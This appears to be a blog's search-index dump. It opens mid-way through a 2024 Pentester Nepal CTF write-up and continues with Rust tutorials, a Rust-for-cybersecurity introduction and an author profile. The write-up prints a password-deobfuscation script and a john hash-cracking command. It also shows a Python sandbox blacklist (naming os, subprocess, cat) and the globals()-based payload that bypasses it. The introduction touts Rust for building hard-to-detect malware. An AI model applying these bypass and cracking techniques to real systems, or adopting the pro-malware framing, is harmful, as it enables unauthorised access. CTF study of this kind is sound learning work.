\u0026#34;YwgJYw0=\u0026#34;, \u0026#34;SAljWQg=\u0026#34;, \u0026#34;CUVjSAw=\u0026#34;, \u0026#34;Y05ZSlk=\u0026#34;, \u0026#34;TglZQQ==\u0026#34; }; private static final byte[] SALTS = {0x5a, 0x3c, 0x77, 0x2d}; public PasswordChecker() { // Constructor } public static void main(String[] args) { Scanner scanner = new Scanner(System.in); System.out.print(\u0026#34;Enter the password: \u0026#34;); String inputPassword = scanner.nextLine(); if (checkPassword(inputPassword)) { System.out.println(\u0026#34;Access granted!\u0026#34;); } else { System.out.println(\u0026#34;Access denied!\u0026#34;); } scanner.close(); } private static boolean checkPassword(String inputPassword) { StringBuilder decodedString = new StringBuilder(); for (String encodedPart : ENCODED_PARTS) { byte[] decodedBytes = Base64.getDecoder().decode(encodedPart); for (int i = SALTS.length - 1; i \u0026gt;= 0; i--) { decodedBytes = xorWithSalt(decodedBytes, SALTS[i]); } decodedString.append(new String(decodedBytes)); } return decodedString.toString().equals(inputPassword); } private static byte[] xorWithSalt(byte[] data, byte salt) { byte[] result = new byte[data.length]; for (int i = 0; i \u0026lt; data.length; i++) { result[i] = (byte) (data[i] ^ salt); } return result; } } The above code prompts the user to enter a password. It then decodes a series of Base64-encoded strings, applies a series of XOR operations using predefined salt values to the decoded byte arrays, and concatenates the results. The final decoded string is compared with the user input. If they match, access is granted; otherwise, access is denied. We can use the folliwing java code:\nimport java.util.Base64; public class ReverseEngineerPassword { // Encoded parts of the password private static final String[] ENCODED_PARTS = { \u0026#34;bGhyf2g=\u0026#34;, \u0026#34;eg4IR3Y=\u0026#34;, \u0026#34;CEoIYw0=\u0026#34;, \u0026#34;CWN6SXI=\u0026#34;, \u0026#34;YwgJYw0=\u0026#34;, \u0026#34;SAljWQg=\u0026#34;, \u0026#34;CUVjSAw=\u0026#34;, \u0026#34;Y05ZSlk=\u0026#34;, \u0026#34;TglZQQ==\u0026#34; }; // Salts for XOR operation private static final byte[] SALTS = { 0x5a, 0x3c, 0x77, 0x2d }; public static void main(String[] args) { // Step 1 \u0026amp; 2: Decode Base64 strings StringBuilder password = new StringBuilder(); for (String part : ENCODED_PARTS) { byte[] decodedBytes = Base64.getDecoder().decode(part); // Step 3: Apply XOR with salts for (byte salt : SALTS) { decodedBytes = xorWithSalt(decodedBytes, salt); } // Step 4: Reconstruct the password password.append(new String(decodedBytes)); } // Print the reconstructed password System.out.println(\u0026#34;Reconstructed Password: \u0026#34; + password.toString()); } private static byte[] xorWithSalt(byte[] data, byte salt) { byte[] result = new byte[data.length]; for (int i = 0; i \u0026lt; data.length; i++) { result[i] = (byte) (data[i] ^ salt); } return result; } } This outputs us the flag as PTNCTF24{J4v4_15_FuN_45_1t5_e45y_t0_rever5e}. You may ask why? The above program reconstructs the password by:\nDecoding: It decodes each Base64-encoded string in ENCODED_PARTS. XOR Operations: Each decoded byte array is XORed sequentially with the bytes in the SALTS array to reverse the obfuscation. Concatenation: The results of the XOR operations are concatenated into a single string. Output: The concatenated string is printed, revealing the original password or flag. The flag PTNCTF24{J4v4_15_FuN_45_1t5_e45y_t0_rever5e} is the original password obfuscated by the encoding and XOR process.\nMisc decrypt It gave us a hash: $y$j9T$dYMhyRh/23xp5tOaurjUg1$tiV5fTsrRm.rBAdtroibEydS9HDQ4/R/dbUMBDFfYl. Upon looking up on hash identifier website, it was found to be yescrypt which is not supported to be cracked by both hashcat and john, but\u0026hellip; If we use --format=crypt with john, and the OS is Kali (which natively supports yescrypt) it cracks the hash for us. So, all I did was ran john crackme.txt --format=crypt --wordlis=/usr/share/wordlist/rockyou.txt and waited for it to crack the hash. There we go, we got our password and the flag is PTN{mathematics}\nDiscord After doing million of lookup on the website (tenor.com) ofcourse, I couldnt find anything. I tried to look like bunch of stuffs like frames by frames too. Then at the end I tried to \u0026ldquo;Copy Text\u0026rdquo; and pasted it in my terminal (tbh idk why lol) then found the flag there as PTNCTF24{Let_the_game_begin}. space-me So the website was http://unthinkable.me/ptn-ctf.html where we were supposed to look for the flag. So, I was analyzing the source code and found nothing. Fired up burpsuite and noticed something unusual in response. Since there were alot of spaces and tabs mixed. I saved the spaces/tabs in a h1 file like this:\n┌──(rezy㉿dev)-[~/Downloads/attachments] └─$ echo \u0026#34; \u0026#34; \u0026gt; h1 Then I replaced all the spaces and tabs with 0 and 1 like:\n┌──(rezy㉿dev)-[~/Downloads/attachments] └─$ sed -e \u0026#39;s/\\t/0/g\u0026#39; -e \u0026#39;s/ /1/g\u0026#39; h1 \u0026gt; output_file ┌──(rezy㉿dev)-[~/Downloads/attachments] └─$ cat output_file 10101111101010111011000110111100101010111011100110000100100100111100111010011001110011001010000011001110100011001010000010011110100100111001001110100000100111101001110111001111100010101000101110100000110011111010000011011001101000001100111010000010 I tried to check it\u0026rsquo;s corresponding ASCII value, but nop! I again did the same thing but now tabs by 0 an spaces by 1.\n┌──(rezy㉿dev)-[~/Downloads/attachments] └─$ sed -e \u0026#39;s/\\t/1/g\u0026#39; -e \u0026#39;s/ /0/g\u0026#39; h1 \u0026gt; final ┌──(rezy㉿dev)-[~/Downloads/attachments] └─$ cat final 01010000010101000100111001000011010101000100011001111011011011000011000101100110001100110101111100110001011100110101111101100001011011000110110001011111011000010110001000110000011101010111010001011111001100000101111100100110010111110011000101111101 Then when I check it\u0026rsquo;s corresponding ASCII value, we get our flag as PTNCTF{l1f3_1s_all_ab0ut_0_\u0026amp;_1}. executionar So here we got our ip and the port misc.challenges.ctf.pentesternepal.com 4445. I tried to connect to it using netcat which gives us a python code:\ndef flag(): with open(\u0026#39;flag.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: print(f.read()) blacklist = [ \u0026#39;import\u0026#39;, \u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;breakpoint\u0026#39;, \u0026#39;flag\u0026#39;, \u0026#39;txt\u0026#39;, \u0026#39;read\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;exec\u0026#39;, \u0026#39;dir\u0026#39;, \u0026#39;print\u0026#39;, \u0026#39;subprocess\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;echo\u0026#39;, \u0026#39;cat\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;\u0026#39;\u0026#39;, \u0026#39;open\u0026#39;,\u0026#39;flag\u0026#39;,\u0026#39;blacklist\u0026#39; ] while True: command = input(\u0026#39;Waiting for yours command: \u0026#39;) if any(b in command for b in blacklist): print(\u0026#39;Invalid command!\u0026#39;) continue try: exec(command) except Exception: print(\u0026#39;You have been locked away...\u0026#39;) exit(1337) The Python script above defines a function called flag that reads and prints the contents of a file named \u0026ldquo;flag.txt.\u0026rdquo; It also establishes a list of forbidden words called blacklist, which includes terms like \u0026lsquo;import\u0026rsquo;, \u0026lsquo;os\u0026rsquo;, \u0026lsquo;sys\u0026rsquo;, \u0026lsquo;flag\u0026rsquo;, and \u0026lsquo;open\u0026rsquo;. The script then enters an infinite loop, prompting the user to input a command. If the input command contains any words from the blacklist, the script responds with \u0026ldquo;Invalid command!\u0026rdquo; and prompts the user again. If the command passes the blacklist check, the script attempts to execute it using the exec function. If any exception occurs during execution, the script prints \u0026ldquo;You have been locked away\u0026hellip;\u0026rdquo; and exits with a specific error code. This setup is intended to prevent certain actions and protect sensitive information like the contents of \u0026ldquo;flag.txt.\u0026rdquo;\nThe netcat session also asks me to input a command where I need to write a command to execute. To read flag, I am supposed to get into function flag(). Since we have blacklist in this script we can\u0026rsquo;t do anything much. But\u0026hellip;.\nIn Python there is a global function called globals that returns a dictionary with all global functions and variables of the script.\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; globals() {\u0026#39;__name__\u0026#39;: \u0026#39;__main__\u0026#39;, \u0026#39;__doc__\u0026#39;: None, \u0026#39;__package__\u0026#39;: None, \u0026#39;__loader__\u0026#39;: \u0026lt;class \u0026#39;_frozen_importlib.BuiltinImporter\u0026#39;\u0026gt;, \u0026#39;__spec__\u0026#39;: None, \u0026#39;__annotations__\u0026#39;: {}, \u0026#39;__builtins__\u0026#39;: \u0026lt;module \u0026#39;builtins\u0026#39; (built-in)\u0026gt;} \u0026gt;\u0026gt;\u0026gt; a = 4444 \u0026gt;\u0026gt;\u0026gt; globals().get(\u0026#39;a\u0026#39;) 4444 They also works great with functions like:\n\u0026gt;\u0026gt;\u0026gt; def f(): ... print(\u0026#39;hey\u0026#39;) ... \u0026gt;\u0026gt;\u0026gt; globals().get(\u0026#39;f\u0026#39;) \u0026lt;function f at 0x101137920\u0026gt; \u0026gt;\u0026gt;\u0026gt; globals().get(\u0026#39;f\u0026#39;)() hey Now, we only need to use a string without single/double quotes. There are several ways, like using a list of integers as bytes or using chr and + like:\n\u0026gt;\u0026gt;\u0026gt; list(b\u0026#39;flag\u0026#39;) [102, 108, 97, 103] \u0026gt;\u0026gt;\u0026gt; bytes([102, 108, 97, 103]).decode() \u0026#39;flag\u0026#39; \u0026gt;\u0026gt;\u0026gt; chr(102) + chr(108) + chr(97) + chr(103) \u0026#39;flag\u0026#39; Now, we have all the pieces. Let\u0026rsquo;s join them and construct a payload: globals().get(bytes((102, 108, 97, 103)).decode())(). All I did was used this command and boom we get our flag.\n┌──(rezy㉿dev)-[~] └─$ nc misc.challenges.ctf.pentesternepal.com 4445 [// .. PYTHON SNIP .. \\\\] Waiting for yours command: globals().get(bytes((102, 108, 97, 103)).decode())() PTNCTF24{d1d_y0u_r34lly_Knew_That} ","permalink":"http://localhost:1313/posts/ctf/ptn-ctf-24/","summary":"Hello guys, this year PTN is hosting 24 hour CTF competition in celebration of 11th Anniversary. The CTF is styled in jeopardy mode. So I, rezydev is playing this CTF with NCA1@Nepal. Let\u0026rsquo;s get into CTF writeup now.\nNo one goes empty handed! The CTF was supposed to be started at 3:00 PM NPT but we were supposed to register our team at 12:00 noon. So, I registered my team and was just looking around the website to read \u0026ldquo;CTF Competition Rules\u0026rdquo;.","title":"Pentester Nepal's 2024 CTF Writeups"},{"content":"Hey there, it\u0026rsquo;s Rezy Dev! Today, we’re going to talk about one of the most important parts of Rust programming—memory management. If you\u0026rsquo;ve been keeping up, you know Rust focuses on safety and performance, and memory management is key to that.\nUnderstanding memory management is essential for writing efficient and safe Rust code. We’ll explore how Rust handles memory using concepts like The Stack, The Heap, Ownership, Borrowing, and more. Ready? Let’s get started!\nThe Stack, the Heap, and Pointers Rust uses two main memory areas: the stack and the heap.\nThe Stack: Think of the stack as a fast and organized place for storing data that has a fixed size and known lifetime. Variables that you define in functions are stored here. It’s like a stack of plates: you add and remove plates in a Last In, First Out (LIFO) order. For example:\nfn stack_example() { let a = 10; // Stored on the stack let b = 20; // Stored on the stack let c = a + b; // Computed and stored on the stack } The Heap: The heap is for data with a dynamic size or unknown size at compile time. It’s like a large storage room where you can put objects and take them out as needed. This comes into play with data that might change in size, like vectors or strings. Here’s an example:\nfn heap_example() { let mut v = Vec::new(); // Vector on the heap v.push(1); v.push(2); let mut s = String::from(\u0026#34;Mom, I\u0026#39;m a hacker.\u0026#34;); // String on the heap println!(\u0026#34;{}\u0026#34;, s); } Ownership and Borrowing Rust’s unique approach to memory management involves ownership and borrowing. This system prevents data races and ensures memory safety.\nOwnership: Every value in Rust has a single owner, and when the owner goes out of scope, the value is automatically dropped. Here’s a basic example:\nfn ownership_example() { let x = String::from(\u0026#34;Mom, I\u0026#39;m a hacker.\u0026#34;); // x owns the string let y = x; // Ownership of the string is transferred to y // println!(\u0026#34;{}\u0026#34;, x); // Error: x no longer owns the string println!(\u0026#34;{}\u0026#34;, y); // Works fine: y owns the string now } Borrowing: You can also borrow a value without taking ownership of it. This is useful for functions that need to read but not modify the data.\nfn borrowing_example(s: \u0026amp;String) { println!(\u0026#34;{}\u0026#34;, s); // Borrowing s, read-only } fn main() { let s = String::from(\u0026#34;Mom, I\u0026#39;m a hacker.\u0026#34;); borrowing_example(\u0026amp;s); // Borrow s println!(\u0026#34;{}\u0026#34;, s); // s is still valid } Mutable References: If you need to modify the data, you can borrow it mutably. Note that you can only have one mutable reference to a value at a time.\nfn mutable_borrow_example(s: \u0026amp;mut String) { s.push_str(\u0026#34;, world!\u0026#34;); } fn main() { let mut s = String::from(\u0026#34;Hello\u0026#34;); mutable_borrow_example(\u0026amp;mut s); // Mutable borrow println!(\u0026#34;{}\u0026#34;, s); // s has been modified } Giving References to Functions: When passing references to functions, ensure that you follow Rust’s borrowing rules to avoid conflicts.\nfn process_string(s: \u0026amp;String) { // Process the string } fn main() { let s = String::from(\u0026#34;Mom, I\u0026#39;m a hacker.\u0026#34;); process_string(\u0026amp;s); // Passing a reference } Copy Types Some types in Rust implement the Copy trait, allowing them to be copied rather than moved. This is generally for simple, fixed-size types like integers.\nfn copy_example() { let a = 5; // i32 is a Copy type let b = a; // Copying a to b println!(\u0026#34;a: {}, b: {}\u0026#34;, a, b); // Both a and b are valid } Lifetimes Lifetimes in Rust are used to ensure that references are valid as long as they are needed. They prevent dangling references and help manage memory safety.\nfn longest\u0026lt;\u0026#39;a\u0026gt;(s1: \u0026amp;\u0026#39;a str, s2: \u0026amp;\u0026#39;a str) -\u0026gt; \u0026amp;\u0026#39;a str { if s1.len() \u0026gt; s2.len() { s1 } else { s2 } } fn main() { let s1 = String::from(\u0026#34;long string\u0026#34;); let s2 = String::from(\u0026#34;short\u0026#34;); let result = longest(\u0026amp;s1, \u0026amp;s2); println!(\u0026#34;The longest string is {}\u0026#34;, result); } Further Reading Since I\u0026rsquo;ve only provided a general overview of how these concepts work, I recommend checking out the following resources for a clearer and more detailed understanding, which will help you become a better programmer. :)\nThe Rust Programming Language - Ownership\nRust Reference - Lifetimes\nRust by Example - Borrowing\nRust Official Documentation - The Stack and the Heap\nRust Official Documentation - Copy Types\nThat’s a wrap for today’s exploration of memory management in Rust! I hope you found this post both informative and fun. As always, feel free to reach out with any questions or comments. Until next time, happy coding!\n","permalink":"http://localhost:1313/posts/rust/memory-management-in-rust/","summary":"Hey there, it\u0026rsquo;s Rezy Dev! Today, we’re going to talk about one of the most important parts of Rust programming—memory management. If you\u0026rsquo;ve been keeping up, you know Rust focuses on safety and performance, and memory management is key to that.\nUnderstanding memory management is essential for writing efficient and safe Rust code. We’ll explore how Rust handles memory using concepts like The Stack, The Heap, Ownership, Borrowing, and more. Ready?","title":"Memory Management in Rust"},{"content":"Welcome back to my Rust series! Today, we\u0026rsquo;re exploring some key concepts: data types and variables. Whether you\u0026rsquo;re working with data during a pentest or creating a custom tool, knowing how Rust manages these basics is crucial.\nTypes In Rust, every value has a specific type, and understanding these types is crucial, especially when handling different data structures. Rust is a statically typed language, which means that all variable types are known at compile time. This feature helps in catching bugs early, something we all appreciate during a lengthy pentest engagement.\nHere’s a quick overview of some basic types:\nIntegers: For when you need to count something (u8, i32, u64, etc.).\nFloating-Point Numbers: Perfect for dealing with calculations that require precision, like timing the response of a server (f32, f64).\nBooleans: True or False, often used in condition checks (bool).\nCharacters: Represents a single character (char).\nTuples: Group multiple values of different types into one compound type.\nArrays: Fixed-size collection of elements, all of the same type. Ideal for holding things like a list of common passwords or IP addresses.\nExample:\nlet ip_addresses: [u8; 4] = [192, 168, 1, 1]; let port_number: u16 = 8080; let is_open: bool = true; Here, ip_addresses is an array of four u8 elements representing an IPv4 address. The port_number is stored as a u16 integer, and is_open is a boolean that might represent the state of a port after a scan.\nType Inference Rust is smart. It often knows the type of a variable without you explicitly telling it. This is called type inference. While Rust’s compiler is very good at figuring out the type, there are times when you need to be explicit, especially when dealing with more complex types or when you want to avoid ambiguity.\nFor example:\nlet response_time = 120.5; // concluded as f64 let host = \u0026#34;10.0.0.1\u0026#34;; // concluded as \u0026amp;str Rust concludes that response_time is an f64 and host is a string slice (\u0026amp;str). This saves time and keeps the code clean.\nMutability In Rust, variables are immutable by default. This is great for security since it prevents accidental modification of data. But, sometimes you need to change the value of a variable, like when updating the status of a service after an exploit. In such cases, you can declare the variable as mutable using the mut keyword.\nExample:\nlet mut service_status = \u0026#34;running\u0026#34;; println!(\u0026#34;Service status: {}\u0026#34;, service_status); service_status = \u0026#34;exploited\u0026#34;; println!(\u0026#34;Service status: {}\u0026#34;, service_status); In this case, service_status starts as \u0026quot;running\u0026quot; but is later updated to \u0026quot;exploited\u0026quot;. By marking the variable as mut, Rust allows this change.\nConstants and static Variables When you know a value won\u0026rsquo;t change throughout the lifecycle of your program, you use a constant. Constants are declared using the const keyword and must always be typed.\nconst MAX_ATTEMPTS: u8 = 5; Here, MAX_ATTEMPTS might represent the number of times you’ll attempt a brute-force attack before moving on.\nRust also has static variables, which are similar to constants but are static items with a fixed address in memory. They can hold references, and unlike constants, they can be mutable (though mutable static variables are not recommended due to potential data races).\nstatic TIMEOUT: u64 = 3000; In this example, TIMEOUT could represent a global timeout value used throughout your application.\nStrings Working with text is something we often do in pentesting, whether it\u0026rsquo;s manipulating payloads, parsing responses, or logging results. Rust provides two main string types: String and \u0026amp;str.\nString: A heap-allocated, growable string. Use this when you need to own and manipulate the string.\n\u0026amp;str: A string slice, which is a reference to a part of a String. It’s useful for passing strings around without needing to own them.\nExample:\nlet payload = String::from(\u0026#34;GET / HTTP/1.1\\r\\nHost: raunak.xyz\\r\\n\\r\\n\u0026#34;); let host = \u0026amp;payload[16..26]; // \u0026#34;raunak.xyz\u0026#34; Here, payload is a String that holds an HTTP request, and host is a \u0026amp;str that slices a part of the payload.\nPrinting with Display and Debug When it comes to outputting data, Rust provides two main formatting traits: Display and Debug.\nDisplay: Used for user-facing output, typically meant to be more readable.\nDebug: Used for developer-facing output, often more detailed and suitable for debugging.\nLet’s say we’re printing out the result of an exploitation attempt:\nlet exploit_result = (\u0026#34;target.com\u0026#34;, 80, true); println!(\u0026#34;Exploit attempt: {:?}\u0026#34;, exploit_result); // Debug println!(\u0026#34;Target: {}, Port: {}, Success: {}\u0026#34;, exploit_result.0, exploit_result.1, exploit_result.2); // Display Using {:?}, we can print a tuple with Debug formatting, and using {}, we can print individual components with Display formatting.\nMore about Printing Rust also supports more complex formatting through macros like format!, print!, and println!.\nlet exploit_result = (\u0026#34;target.com\u0026#34;, 80, true); let report = format!(\u0026#34;Target: {}\\nPort: {}\\nSuccess: {}\u0026#34;, exploit_result.0, exploit_result.1, exploit_result.2); println!(\u0026#34;{}\u0026#34;, report); Here, format! creates a formatted string that we can then print or log.\nConclusion Mastering data types and variables in Rust is key to writing efficient, secure, and strong code. By using Rust’s type system and mutability features, you can manage different data situations accurately and safely.\nFurther Reading The Rust Programming Language - Data Types\nRust By Example - Variables\nRust Reference - Variables and Types\nRust Language - Constants and Static Variables\nRust Documentation - Formatting\n","permalink":"http://localhost:1313/posts/rust/data-types-and-variables-in-rust/","summary":"Welcome back to my Rust series! Today, we\u0026rsquo;re exploring some key concepts: data types and variables. Whether you\u0026rsquo;re working with data during a pentest or creating a custom tool, knowing how Rust manages these basics is crucial.\nTypes In Rust, every value has a specific type, and understanding these types is crucial, especially when handling different data structures. Rust is a statically typed language, which means that all variable types are known at compile time.","title":"Data Types and Variables in Rust"},{"content":"Hey there! I\u0026rsquo;m really pumped to take you on a journey into the world of Rust today. We\u0026rsquo;re going to write our very first Rust program, and I\u0026rsquo;ll explain some key concepts along the way to help you feel like a pro. Let\u0026rsquo;s dive in!\nCargo: The Build System and Package Manager Before we start coding, let\u0026rsquo;s talk about Cargo. Think of Cargo as your best friend in Rust. It\u0026rsquo;s the official build system and package manager for Rust, and it\u0026rsquo;s a game-changer. With Cargo, you can easily manage your projects, handle dependencies, run tests, and even build documentation—all from the command line.\nCargo makes compiling and managing a Rust project much simpler. Instead of manually compiling your code with rustc, Cargo does it for you. It\u0026rsquo;s like having a tool that automates boring tasks, letting you focus on the fun parts.\nSo, why use Cargo instead of rustc directly? While rustc is good for compiling individual files, Cargo is designed for managing whole projects. It helps you keep track of dependencies, ensures your project is built consistently, and makes it easy to share your code with others. In short, Cargo makes life easier, just like how tools like metasploit or nmap make finding vulnerabilities simpler.\nCreating a New Rust Project with Cargo Now, let’s create our first Rust project using Cargo. Open up your terminal and type:\ncargo new hello_rust This command creates a new directory called hello_rust with some files and folders inside. But what exactly did Cargo set up for us?\nWhen you create a project with Cargo, it generates a directory structure that looks something like this:\nCargo.toml: This is the configuration file for your project. It’s written in TOML (Tom’s Obvious, Minimal Language). Here, you can specify your project’s name, version, dependencies, and other metadata. It\u0026rsquo;s like the settings.py in a Django project or package.json in a Node.js project.\nsrc/: This directory contains all your Rust source files. By default, Cargo creates a main.rs file here, which is the entry point of your Rust application.\nCargo also keeps track of a cargo.lock file (once you start adding dependencies). This file ensures that everyone who builds your project uses the exact same versions of your dependencies, maintaining consistency—a crucial aspect in software development.\nWriting Your First Rust Program Alright, enough with the theory—let\u0026rsquo;s write some code! Open the main.rs file inside the src/ directory. You’ll see something like this:\nfn main() { println!(\u0026#34;Hello, world!\u0026#34;); } This simple program prints \u0026ldquo;Hello, world!\u0026rdquo; to the console. It\u0026rsquo;s a classic starting point in almost every programming language, and Rust is no exception.\nPrinting in Rust The println! macro is Rust’s way of printing text to the console. Notice the exclamation mark !—this indicates that println! is a macro, not a regular function. Macros in Rust are powerful tools that allow you to write code that writes other code, which can be incredibly useful in many situations. For now, just remember that println! is your go-to for outputting text.\nTo run your program, simply type:\ncargo run Cargo will compile your code and execute the resulting binary. You should see \u0026ldquo;Hello, world!\u0026rdquo; printed on your terminal.\nComments: Documenting Your Code Now that we\u0026rsquo;ve got our program running, let’s talk about comments. As a pentester, I can\u0026rsquo;t stress enough how important it is to document your work. Whether you\u0026rsquo;re writing a pentest report or coding, clear documentation is key.\nRust supports two main types of comments:\nSingle-line comments: These start with // and extend to the end of the line.\n// This is a single-line comment Multi-line comments: These are enclosed in /* */ and can span multiple lines.\n/* This is a multi-line comment. Useful for longer explanations or disabling blocks of code. */ Rust also supports documentation comments, which are a special kind of comment used to generate external documentation. Documentation comments (/// for single lines and /** */ for multiple lines) are used to create API documentation for your code. This is similar to how you might write comments in other languages to explain what a piece of code does, but in Rust, these comments can be automatically compiled into rich, formatted documentation.\n/// This function prints a greeting to the console. fn greet() { println!(\u0026#34;Hello, world!\u0026#34;); } Commenting your code is crucial because it helps others (and your future self) understand what’s happening in your code. It\u0026rsquo;s like leaving breadcrumbs during a pentest to trace your steps or providing detailed explanations in a report.\nConclusion And there you have it—your first Rust program! We\u0026rsquo;ve covered a lot of ground today, from understanding Cargo and its directory structure to writing and running a simple \u0026ldquo;Hello, world!\u0026rdquo; program. We also touched on the importance of comments and documentation in code.\nAs we continue our Rust journey, we\u0026rsquo;ll dive deeper into more complex topics, but for now, enjoy the satisfaction of seeing that \u0026ldquo;Hello, world!\u0026rdquo; printed on your screen. Rust is a powerful language with a lot to offer, and I can’t wait to explore more of it with you.\nHappy coding, and keep documenting!\n","permalink":"http://localhost:1313/posts/rust/writing-our-first-rust-program/","summary":"Hey there! I\u0026rsquo;m really pumped to take you on a journey into the world of Rust today. We\u0026rsquo;re going to write our very first Rust program, and I\u0026rsquo;ll explain some key concepts along the way to help you feel like a pro. Let\u0026rsquo;s dive in!\nCargo: The Build System and Package Manager Before we start coding, let\u0026rsquo;s talk about Cargo. Think of Cargo as your best friend in Rust. It\u0026rsquo;s the official build system and package manager for Rust, and it\u0026rsquo;s a game-changer.","title":"Writing Our First Rust Program"},{"content":"Introduction Rust is a modern programming language that has become popular because it combines speed, control, and safety. It offers the performance and control of languages like C and C++, while also ensuring memory safety, which is a big advantage seen in newer languages like Python. Rust uses new ideas that might be different from what you know in other languages, so it needs careful thought and understanding.\nOne challenge with Rust is that it needs a more structured way of learning. You can\u0026rsquo;t just \u0026ldquo;figure things out as you go.\u0026rdquo; Instead, you need to understand it deeply and practice deliberately.\nRust may be new, but with the right approach, you can master it and write efficient, safe, and reliable code.\nInstallation of Rust in Linux In this series, we will use Linux. The following command should install Rust on our system:\ncurl --proto \u0026#39;=https\u0026#39; --tlsv1.2 -sSf https://sh.rustup.rs | sh Also, make sure to install the CodeLLDB and Rust Analyzer extensions in VS Code so that we can write our Rust code here.\nNow that we have a general overview of Rust and have installed and configured it in VS Code, let\u0026rsquo;s talk about using Rust for cybersecurity\u0026hellip;\nRust for Cybersecurity Rust is becoming a strong tool in cybersecurity, providing many benefits for tasks like penetration testing, automation, bug bounty hunting, and malware development. Its mix of speed, safety, and modern features makes it perfect for these areas. Here’s why Rust is becoming popular in cybersecurity:\n1. Penetration Testing Performance and Control: Rust gives you the low-level access needed for tasks like network scanning, packet crafting, and exploiting vulnerabilities. It offers the speed and control of languages like C or C++, which is important for real-time applications in penetration testing.\nMemory Safety: One of Rust’s best features is its ability to prevent common memory-related issues (e.g., buffer overflows) that can cause security problems. This ensures that the tools you create are not only effective but also secure.\n2. Automation Concurrency: Rust’s ownership model and concurrency features make it great for writing safe, concurrent applications. This is especially useful for automating repetitive tasks in cybersecurity, like brute-forcing passwords or running large-scale scans.\nCross-Platform Development: Rust’s cross-compilation capabilities let you write tools that work well on different operating systems, from Linux to Windows, making your automated tools more versatile.\n3. Bug Bounty Hunting Tooling: Rust is great for making custom tools and scripts for specific bug bounty tasks. Its speed ensures your tools can manage large datasets and complex tasks quickly and efficiently.\nReliability: Rust’s strong type system and compile-time checks help prevent bugs in your tools, allowing you to focus on finding bugs in other systems without worrying about your own tools\u0026rsquo; reliability.\n4. Malware Development Stealth and Efficiency: Rust can create small, efficient programs, which is useful for making lightweight malware that is hard to detect. Its speed also allows for quick execution of harmful actions.\nObfuscation: Rust’s complicated syntax and structure make it harder to reverse engineer, adding extra security for malware developers.\n5. General Benefits Growing Ecosystem: Rust’s ecosystem is growing fast, with many libraries and frameworks useful for cybersecurity tasks. From cryptography libraries to networking crates, Rust has you covered.\nCommunity and Support: The Rust community is very helpful and is expanding quickly in the cybersecurity field. This means as you start using Rust, you’ll have plenty of knowledge and support available.\nConclusion In conclusion, Rust is not just another modern programming language; it\u0026rsquo;s a vital tool for cybersecurity professionals. Whether you’re building sophisticated penetration testing tools, automating complex security tasks, hunting for vulnerabilities, or even developing advanced malware, Rust offers the perfect balance of performance, safety, and flexibility. As the landscape of cybersecurity continues to shift and grow, Rust\u0026rsquo;s influence in the field is poised to expand, making it an essential language for those looking to stay ahead in the game. This marks the beginning of an exciting journey into Rust for cybersecurity on my blog. Stay tuned as we dive deeper into how this powerful language can enhance your skills and projects in the cybersecurity domain.\n","permalink":"http://localhost:1313/posts/rust/introduction-and-installation-of-rust-language/","summary":"Introduction Rust is a modern programming language that has become popular because it combines speed, control, and safety. It offers the performance and control of languages like C and C++, while also ensuring memory safety, which is a big advantage seen in newer languages like Python. Rust uses new ideas that might be different from what you know in other languages, so it needs careful thought and understanding.\nOne challenge with Rust is that it needs a more structured way of learning.","title":"Introduction and Installation of Rust Language"},{"content":"██████╗ ███████╗███████╗██╗ ██╗██████╗ ███████╗██╗ ██╗ ██╔══██╗██╔════╝╚══███╔╝╚██╗ ██╔╝██╔══██╗██╔════╝██║ ██║ ██████╔╝█████╗ ███╔╝ ╚████╔╝ ██║ ██║█████╗ ██║ ██║ ██╔══██╗██╔══╝ ███╔╝ ╚██╔╝ ██║ ██║██╔══╝ ╚██╗ ██╔╝ ██║ ██║███████╗███████╗ ██║ ██████╔╝███████╗ ╚████╔╝ ╚═╝ ╚═╝╚══════╝╚══════╝ ╚═╝ ╚═════╝ ╚══════╝ ╚═══╝ Security Nerd | Wannabe Rust Dev | CTF Player 🛡️ Personals: I\u0026rsquo;m pursuing Bachelor\u0026rsquo;s degree (CS Major) 🎓 I\u0026rsquo;m from Nepal 🇳🇵 Current Hustles: 🕵️‍♂️ Digging through web exploits \u0026amp; 🐛 squashing bugs! 🦀 Jamming with Rust—it’s not just for metal. On My Radar: 🚀 Experimenting with new Rust frameworks and hacking tools. 🛠️ Always chasing the next CTF challenge! Peek into my projects: GitHub Portfolio\nLatest posts: /posts\nAsk me about: Penetration Testing 💻 Rust Programming 🦀 Python Programming 🐍 Reach me at: me [@] rezydev.xyz ","permalink":"http://localhost:1313/whoami/","summary":"██████╗ ███████╗███████╗██╗ ██╗██████╗ ███████╗██╗ ██╗ ██╔══██╗██╔════╝╚══███╔╝╚██╗ ██╔╝██╔══██╗██╔════╝██║ ██║ ██████╔╝█████╗ ███╔╝ ╚████╔╝ ██║ ██║█████╗ ██║ ██║ ██╔══██╗██╔══╝ ███╔╝ ╚██╔╝ ██║ ██║██╔══╝ ╚██╗ ██╔╝ ██║ ██║███████╗███████╗ ██║ ██████╔╝███████╗ ╚████╔╝ ╚═╝ ╚═╝╚══════╝╚══════╝ ╚═╝ ╚═════╝ ╚══════╝ ╚═══╝ Security Nerd | Wannabe Rust Dev | CTF Player 🛡️ Personals: I\u0026rsquo;m pursuing Bachelor\u0026rsquo;s degree (CS Major) 🎓 I\u0026rsquo;m from Nepal 🇳🇵 Current Hustles: 🕵️‍♂️ Digging through web exploits \u0026amp; 🐛 squashing bugs! 🦀 Jamming with Rust—it’s not just for metal.","title":""}]